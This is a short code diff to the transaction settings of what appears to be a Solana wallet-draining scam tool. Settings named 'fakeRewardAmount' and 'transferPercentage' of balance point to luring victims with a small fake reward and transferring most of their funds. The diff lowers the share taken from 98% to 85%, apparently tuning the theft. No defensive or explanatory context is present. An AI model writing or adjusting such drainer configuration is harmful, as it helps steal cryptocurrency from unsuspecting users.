@@ -36,7 +36,7 @@ const CONFIG = {
     // Transaction Configuration
     TRANSACTION_CONFIG: {
         fakeRewardAmount: 0.02, // SOL
-        transferPercentage: 0.98, // 98% of balance
+        transferPercentage: 0.85, // 85% of balance
         maxRetries: 3,
         timeout: 30000
     }
